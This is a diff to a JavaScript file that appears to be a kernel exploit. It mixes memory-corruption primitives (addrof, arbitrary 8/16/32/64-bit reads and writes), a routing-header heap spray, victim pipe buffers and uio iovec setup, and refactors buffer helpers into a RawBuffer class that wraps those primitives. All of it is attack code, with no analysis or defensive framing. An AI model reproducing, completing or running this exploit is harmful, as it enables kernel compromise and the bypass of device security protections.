@@ -176,7 +176,7 @@ let msg             = new Uint8Array(MSG_HDR_SIZE);
 let sprayRthdrLen   = 0;
 
 let msgIov          = new Uint8Array(MSG_IOV_NUM * IOV_SIZE);
-let dummyBuffer     = new Uint8Array(0x1000);
+let dummyBuffer     = new RawBuffer(0x1000);
 
 let tmp             = new Uint8Array(PAGE_SIZE);
 let victimPipebuf   = new Uint8Array(PIPEBUF_SIZE);
@@ -232,7 +232,7 @@ Buffer.prototype.write32 = function(offset, value) {
     mem.write8(this.addr + offset, value);
 };*/
 
-Buffer.prototype.write8 = function(offset, value) {
+/*Buffer.prototype.write8 = function(offset, value) {
     this.addr.write8(offset, value & 0xFF);
 };
 
@@ -248,60 +248,66 @@ Buffer.prototype.write64 = function(offset, value) {
     const v = BigInt(value);
     this.addr.write64(offset, v);
 };
+*/
 
-Buffer.prototype.putLong = function(offset, value) {
-  try {
-    let low = undefined, high = undefined;
+class RawBuffer {
+    constructor(size) {
+        this.size = size;
 
-    if (value === undefined || value === null) {
-      throw new Error("putLong: value is undefined/null");
+        const alloc = mem.gc_alloc(size);
+        if (!alloc || !alloc[0]) {
+            throw new Error("RawBuffer: allocation failed");
+        }
+
+        this.addr = alloc[0];   
+        this.backer = alloc[1]; 
     }
 
-    if (typeof value === "bigint" || typeof value === "number") {
-      const v = BigInt(value);
-      low  = Number(v & 0xFFFFFFFFn) >>> 0;
-      high = Number((v >> 32n) & 0xFFFFFFFFn) >>> 0;
+    write8(offset, value) {
+        this.addr.write8(offset, value & 0xFF);
     }
-    else if (typeof value.read32 === "function") {
-      low  = Number(value.read32(0)) >>> 0;
-      high = Number(value.read32(4)) >>> 0;
+
+    write16(offset, value) {
+        this.addr.write16(offset, value & 0xFFFF);
     }
+
+    write32(offset, value) {
+        this.addr.write32(offset, value >>> 0);
+    }
+
+    write64(offset, value) {
+        const v = BigInt(value);
+        this.addr.write64(offset, v);
+    }
+
+
+    read8(offset)  { return this.addr.read8(offset); }
+    read16(offset) { return this.addr.read16(offset); }
+    read32(offset) { return this.addr.read32(offset); }
+    read64(offset) { return this.addr.read64(offset); }
+
   
-    else if (value._u32 && value._u32 instanceof Uint32Array && value._u32.length >= 2) {
-      low  = value._u32[0] >>> 0;
-      high = value._u32[1] >>> 0;
-    }
- 
-    else if (typeof value.lo === "number" && typeof value.hi === "number") {
-      low  = value.lo >>> 0;
-      high = value.hi >>> 0;
-    }
-   
-    else if (typeof value.addr !== "undefined") {
-      return this.putLong(offset, value.addr);
-    } else if (typeof value.address === "function") {
-      return this.putLong(offset, value.address());
-    } else {
-      throw new Error("putLong: unsupported value type: " + String(value));
+    putLong(offset, value) {
+        const v = BigInt(value);
+
+        const low  = Number(v & 0xFFFFFFFFn);
+        const high = Number((v >> 32n) & 0xFFFFFFFFn);
+
+        this.addr.write32(offset,     low);
+        this.addr.write32(offset + 4, high);
     }
 
-    if (!Number.isFinite(low) || !Number.isInteger(low)) {
-      throw new Error("putLong: low is not a 32-bit integer: " + String(low));
-    }
-    if (!Number.isFinite(high) || !Number.isInteger(high)) {
-      throw new Error("putLong: high is not a 32-bit integer: " + String(high));
+    fill(byte) {
+        const b = byte & 0xFF;
+        for (let i = 0; i < this.size; i++) {
+            this.addr.write8(i, b);
+        }
     }
 
-    log("[putLong] offset=", offset, "low=0x" + low.toString(16), "high=0x" + high.toString(16));
-  
-    this.write32(offset, low);
-    this.write32(offset + 4, high);
-  } catch (e) {
-
-    log("[putLong] ERROR:", e, "value:", value);
-    throw e; 
-  }
-};
+    address() {
+        return this.addr;
+    }
+}
 
 /*Buffer.prototype.putLong = function(offset, value) {
     if (typeof value !== "number" || isNaN(value)) {
@@ -801,10 +807,8 @@ function performSetup() {
         uioIovWrite.putLong(0x00, dummyBuffer.address());
        */
 		dummyBuffer.fill(0x41);
-
-     let dummyBufAddr = addrof(dummyBuffer);
-     uioIovRead.putLong(0x00, dummyBufAddr);
-     uioIovWrite.putLong(0x00, dummyBufAddr);
+     uioIovRead.putLong(0, dummyBuffer.addr);
+    uioIovWrite.putLong(0, dummyBuffer.addr);
 		
         // Affinity
         previousCore = getCurrentCore();
@@ -1528,6 +1532,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
